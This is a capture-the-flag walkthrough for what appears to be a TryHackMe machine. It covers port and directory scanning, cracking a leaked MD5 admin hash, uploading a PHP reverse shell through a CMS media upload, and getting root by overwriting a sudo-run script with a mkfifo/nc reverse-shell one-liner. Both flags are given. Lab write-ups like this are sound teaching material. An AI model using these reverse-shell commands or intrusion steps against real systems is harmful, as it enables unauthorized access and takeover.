---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: 
### What is the user flag?
Let's perform a `nmap` scan against the target machine.

```
$ nmap -sC -sV 10.10.37.233               
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-12 09:12 IST
Nmap scan report for 10.10.37.233
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.75 seconds
```
There are two open ports:


| Ports | Service |
| :-: | :-: |
| 22    | ssh        |
| 80      | http        |

We can now use `gobuster` to brute force the web directories.
```
$ gobuster dir -u http://10.10.37.233 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.233
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.37.233/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Let's visit the `/content` page.

![2](https://github.com/Knign/Write-ups/assets/110326359/72fa589f-4863-444e-b755-f4d731429d0a)

Let's perform a directory scan inside the `/content` web directory.

```
$ gobuster dir -u http://10.10.37.233/content -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.233/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.37.233/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.37.233/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.37.233/content/attachment/]
/images               (Status: 301) [Size: 321] [--> http://10.10.37.233/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.37.233/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.37.233/content/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

If we go to the `/content/inc` page, we see the following:

![4](https://github.com/Knign/Write-ups/assets/110326359/e8917264-d00f-4e6f-ad80-2a24f4a77a98)

Let's go inside the `/contemt/inc/mysql` directory.

![5](https://github.com/Knign/Write-ups/assets/110326359/b52f6848-2279-4f15-84a7-7d8bc7c17f25)

We can download and open this file in a text editor.

![6](https://github.com/Knign/Write-ups/assets/110326359/2614775e-9781-4e10-9a87-1cde88c440e5)

If we look, closely we can see the following credentials:

| User | Password hash |
| :-: | :-: |
| manager     |     42f749ade7f9e195bf475f37a44cafcb     |

Since the password is hashed, we need to first identify the type using `hash-identifier`.

```
$ hash-identifier 42f749ade7f9e195bf475f37a44cafcb                     
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Now we can use `john` to crack the hash and obtain the password.

```
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2023-12-12 09:57) 3.448g/s 115862p/s 115862c/s 115862C/s coco21..181193
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

If we go to the `/content/as` page we will come across a login form which we can login to using the following credentials:

| Username | Password |
| :-: | :-: |
| manager         | Password123         |

![7](https://github.com/Knign/Write-ups/assets/110326359/405f9381-1153-4974-ad33-ec399eac078b)

Now that we are in the admin panel, we can start looking for some exploits.

We can obtain a reverse shell from the Revshells page.

![9](https://github.com/Knign/Write-ups/assets/110326359/c9753481-94fd-46d3-9f5a-36514871e5d7)

Once we have it stored in a file, we can upload the file in the `Media Center` of the admin panel with a `php5` extension.

![10](https://github.com/Knign/Write-ups/assets/110326359/18642722-a352-44f6-bd30-a074ed242da1)

Next, we have to set up a `nc` listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
```

Then we can visit the `/content/attachment/` page to access our exploit.

![11](https://github.com/Knign/Write-ups/assets/110326359/a871a290-2820-4ca7-a921-bb7b0d0fb63c)

Let's check our listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.37.233] 60656
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 07:02:32 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We can now `cat` out the user flag.

```
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

### Answer
```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

### What is the root flag?

Let's check what commands our user can execute as root using the `sudo -l` command.

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So we can run the `backup.pl` script as root without any password.

Let's check what the script does.

```
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The `./backup.pl` script executes the `/etc/copy.sh` script.

Let's check what that script does.

```
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

So it establishes a reverse shell to 192.168.0.190 on port 5554.

We can replace the IP and port to our own so that the reverse shell connection is sent to us.

```
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.48.138 9990>/tmp/f' > /etc/copy.sh
```

We now have to set up a `nc` listener and execute the `/home/itguy/backup.pl` script using `sudo`. 

```
$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Let's check our `nc` listener.

```
$ nc -nlvp 9990
listening on [any] 9990 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.37.233] 45084
/bin/sh: 0: can't access tty; job control turned off
# 
```

As we can see, the reverse shell connection has been caught by our listener.

We can now read the root flag.

```
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

### Answer
```
THM{6637f41d0177b6f37cb20d775124699f}
```
